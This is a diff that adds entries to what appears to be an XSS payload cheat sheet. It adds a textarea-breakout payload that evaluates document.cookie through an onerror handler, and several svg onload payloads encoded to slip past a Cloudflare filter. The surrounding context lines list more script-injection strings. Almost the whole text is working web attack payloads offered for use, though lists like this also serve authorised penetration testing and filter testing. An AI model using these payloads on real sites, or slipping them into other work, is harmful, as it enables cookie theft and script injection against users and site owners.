@@ -57,6 +57,7 @@ TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
 ">'><details/open/ontoggle=confirm(1337)>
 %<script>3cscript%<script>3ealert(1)%<script>3c/script%<script>3e
 <input disabled=disabled onbeforecopy=alert(1) value=copyme>
+</textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”
 ```
 
 ## XSS payload with Alert Obfuscation, for bypass RegEx filters
@@ -84,6 +85,10 @@ window&&=(window&&=opener||=alert)?.(1??0,)
 ## Clourflare XSS bypass
 ```js
 <a"/onclick=(confirm)()>Click Here!
+%2sscript%2ualert()%2s/script%2u
+<svg onload=alert%26%230000000040"1")
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
 ```
 
 ## When you find input field which allows " (quotes), try this payload:
